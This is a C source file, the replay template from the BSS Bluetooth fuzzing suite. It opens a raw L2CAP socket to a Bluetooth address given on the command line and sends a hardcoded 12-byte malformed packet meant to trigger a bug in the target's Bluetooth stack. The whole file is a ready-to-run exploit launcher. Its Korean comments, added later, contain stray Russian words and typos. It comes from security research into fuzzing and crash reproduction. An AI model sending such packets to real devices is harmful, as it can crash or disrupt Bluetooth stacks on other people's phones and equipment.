/*	BSS Replay packet template 				*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*								*/
/*	Modify this file, and type 'make' in this directory	*/
/*	Then : ./replay_l2cap_packet <BT_ADDR>			*/

/* Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		12
char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";

int main(int argc, char **argv)
{
	/**
	* main 함수는 실행시 시작 함수입니다.
	* argc는 команд 노선에서 입력된 인자 개수를, argv는 입력된 인자를 포함하는 포인터 배열을 의미합니다.
	*/
	
	struct sockaddr_l2 addr;
	int sock, sent, i;

	/**
	* 소켓 생성을 위한 구조체 변수 선언
	*/

	if(argc < 2)
	{
		/**
		* 인수가 적잡하면 에러 메시지를 출력하고 종료합니다.
		*/
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		/**
		* 소켓 생성이 실패하면 에러 메시지를 출력하고 종료합니다.
		*/
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;

	/**
	* 주소 바인딩을 위한 구조체 변수 초기화
	*/

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		/**
		* 주소 바인딩 실패하면 에러 메시지를 출력하고 종료합니다.
		*/
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &addr.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		/**
		* 연결 실패하면 에러 메시지를 출력하고 종료합니다.
		*/
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
	{
		/**
		* 데이터 전송 성공 메시지를 출력합니다.
		*/
		printf("L2CAP packet sent (%d)\n", sent);
	}

	printf("Buffer:\t");
	for(i=0; i<sent; i++)
		printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
	printf("\n");

	close(sock);
	return EXIT_SUCCESS;
}

/**
* main 함수는 실행시 시작 함수입니다.
* L2CAP 패킷을송신하고, 전송에 성공하면 메시지를 출력합니다.
*/
